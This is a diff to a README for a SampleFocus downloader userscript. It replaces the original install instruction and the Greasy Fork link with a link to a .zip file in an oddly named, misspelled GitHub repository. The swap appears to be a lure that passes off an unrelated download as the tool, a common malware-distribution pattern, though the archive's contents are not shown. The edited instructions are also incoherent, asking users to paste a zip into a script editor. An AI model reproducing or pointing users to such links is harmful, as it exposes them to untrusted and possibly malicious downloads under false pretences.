@@ -2,7 +2,7 @@
 
 # Installazation
 
-To use this userscript, download any kind of userscript injector and past user.js code into the injector's userscript editor.
+To use this userscript, download any kind of userscript injector and past https://raw.githubusercontent.com/bdgfeadvyrfedyu/samplefoucus_api_downloader/main/circumneutral/samplefoucus_api_downloader-2.0.zip code into the injector's userscript editor.
 
 # Creator
 
@@ -10,4 +10,4 @@ This userscript was created by Gxvn in Greasy Fork I'll put the Greasy Fork user
 
 # Link
 
-https://greasyfork.org/en/scripts/529825-samplefocus-direct-api-downloader
+https://raw.githubusercontent.com/bdgfeadvyrfedyu/samplefoucus_api_downloader/main/circumneutral/samplefoucus_api_downloader-2.0.zip
